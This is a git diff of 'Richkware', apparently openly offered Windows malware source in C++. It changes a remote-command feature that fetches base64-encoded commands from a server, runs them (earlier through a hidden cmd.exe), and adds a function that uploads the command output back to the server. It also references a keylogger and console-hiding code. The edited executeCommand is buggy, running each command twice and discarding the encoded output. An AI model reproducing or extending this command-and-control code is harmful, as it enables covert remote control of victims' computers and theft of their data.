@@ -91,9 +91,9 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
-std::vector<std::string> Richkware::updateCommands(const char *serverAddress, const char *port, std::string remainingCommands) {
+std::vector<std::string> Richkware::getCommands(const char *serverAddress, const char *port) {
     //TODO: gestire i remainingCommands
-    std::string commands = network.fetchCommand(serverAddress, port, remainingCommands);
+    std::string commands = network.fetchCommand(serverAddress, port);
     std::string decodedCommands = Base64_decode(commands);
     std::vector<std::string> commandList;
     std::vector<std::string> result;
@@ -113,9 +113,10 @@ std::vector<std::string> Richkware::updateCommands(const char *serverAddress, co
 }
 
 std::string Richkware::executeCommand(std::string command) {
-    std::string formattedCommand = "/C " + command;
-    ShellExecute(NULL, "open", "cmd.exe", formattedCommand.c_str(), NULL, SW_HIDE);    //start is a placeholder for the commands
-    return "";
+    //encrypt the output of the command
+    std::string output = CodeExecution(command);
+    std::string encodedOutput = Base64_encode((const unsigned char *) output.c_str(), output.size());
+    return CodeExecution(command).c_str();
 }
 
 void Richkware::Keylogger(const char *fileName) {
@@ -132,6 +133,10 @@ void Richkware::Hibernation() {
     SendMessage(HWND_BROADCAST,
                 WM_SYSCOMMAND,
                 SC_MONITORPOWER, (LPARAM) 2);
+}
+
+void Richkware::uploadCommandsResponse(std::string output, const char *serverAddress, const char *port) {
+    std::cout << network.uploadCommand(output, serverAddress, port) << std::endl;
 }
 
 
@@ -165,7 +170,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-    ShowWindow(GetConsoleWindow(), 0);
+//    ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
